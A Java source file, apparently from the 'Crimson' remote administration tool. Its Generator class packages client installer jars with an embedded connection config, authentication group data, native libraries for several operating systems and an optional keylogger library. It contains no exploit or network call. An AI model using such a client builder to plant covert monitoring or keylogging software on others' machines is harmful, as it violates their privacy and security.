/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.zeroturnaround.zip.ZipUtil;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.Common.Instance;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.proto.Generator.GenReport;
import com.subterranean_security.crimson.core.proto.Misc.AuthType;
import com.subterranean_security.crimson.core.storage.ClientDB;
import com.subterranean_security.crimson.core.util.B64;
import com.subterranean_security.crimson.core.util.CUtil;

public class Generator {

	private static final Logger log = LoggerFactory.getLogger(Generator.class);

	private File temp = CUtil.Files.Temp.getDir();
	private GenReport.Builder report = GenReport.newBuilder();

	public GenReport getReport() {
		return report.build();
	}

	public Generator() {

	}

	public void generate(ClientConfig config) throws Exception {
		generate(config, 0);
	}

	public void generate(ClientConfig config, int cvid) throws Exception {

		String output = config.getOutputType().toLowerCase();
		if (output.endsWith("(.jar)")) {

			report = genJar(config, cvid).setOutputType("Runnable Java Archive");

		} else if (output.endsWith("(.exe)")) {

		} else if (output.endsWith("(.sh)")) {

		} else {

		}

		System.gc();
	}

	public byte[] getResult() throws IOException {
		byte[] result = CUtil.Files.readFile(new File(temp.getAbsolutePath() + "/installer.jar"));
		CUtil.Files.delete(temp);
		return result;
	}

	private GenReport.Builder genJar(ClientConfig ic, int cvid) throws IOException {
		GenReport.Builder gReport = GenReport.newBuilder();
		Date start = new Date();
		gReport.setGenDate(start.getTime());

		File clientJar = new File(temp.getAbsolutePath() + "/installer.jar");
		File clientDB = new File(temp.getAbsolutePath() + "/client.db");
		File internal = new File(temp.getAbsolutePath() + "/internal.txt");

		// create a database for the client
		try {
			ClientDB database = new ClientDB(clientDB);
			database.storeObject("cvid", cvid);
			database.storeObject("ic", new String(B64.encode(ic.toByteArray())));
			if (ic.getAuthType() == AuthType.GROUP) {
				database.storeObject("auth.group", ServerStore.Authentication.getGroup(ic.getGroupName()));
			}

			database.close();
		} catch (Exception e) {
			e.printStackTrace();
			gReport.setComment("Failed to create client database: " + e.getMessage());
			gReport.setResult(false);
			return gReport;
		}

		// copy the client jar out
		CUtil.Files.extract("com/subterranean_security/crimson/server/res/bin/client.jar", clientJar.getAbsolutePath());

		// add client database to jar
		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/res/bin/client.db", clientDB);

		// add libraries to jar
		File tmpZip = new File(temp.getAbsolutePath() + "/clib.zip");
		tmpZip.mkdir();
		new File(tmpZip.getAbsolutePath() + "/java").mkdirs();

		// add jar files
		for (String lib : CUtil.JavaLibraries.getRequisites(Instance.CLIENT)) {
			if (lib.equals("c19") && !ic.getKeylogger()) {
				continue;
			}
			CUtil.Files.copyFile(new File(Common.Directories.base.getAbsolutePath() + "/lib/java/" + lib + ".jar"),
					new File(tmpZip.getAbsolutePath() + "/java/" + lib + ".jar"));

		}

		// selectively add native libraries
		if (ic.hasPathWin()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/win");
			jniOut.mkdirs();
			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/win").listFiles()) {
				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}

		}
		if (ic.hasPathLin()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/lin");
			jniOut.mkdirs();
			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/lin").listFiles()) {
				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}
		}
		if (ic.hasPathOsx()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/osx");
			jniOut.mkdirs();
			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/osx").listFiles()) {
				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}
		}
		if (ic.hasPathSol()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/sol");
			jniOut.mkdirs();
			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/sol").listFiles()) {
				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}
		}
		if (ic.hasPathBsd()) {
			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/bsd");
			jniOut.mkdirs();
			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/bsd").listFiles()) {
				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
			}
		}

		ZipUtil.unexplode(tmpZip);
		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/res/bin/lib.zip", tmpZip);

		// create and add the internal.txt
		internal.createNewFile();
		PrintWriter pw = new PrintWriter(internal);
		pw.println(B64.encode(ic.toByteArray()));
		pw.close();

		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/internal.txt", internal);

		// delete jars
		// CUtil.Files.delete(clientJar);

		gReport.setHashMd5(CUtil.Files.getHash(clientJar.getAbsolutePath(), "MD5"));
		gReport.setHashSha256(CUtil.Files.getHash(clientJar.getAbsolutePath(), "SHA-256"));
		gReport.setFileSize((int) clientJar.length());
		gReport.setResult(true);
		gReport.setGenTime((int) (new Date().getTime() - start.getTime()));

		log.info("Generated jar in {} ms", gReport.getGenTime());
		return gReport;
	}

}
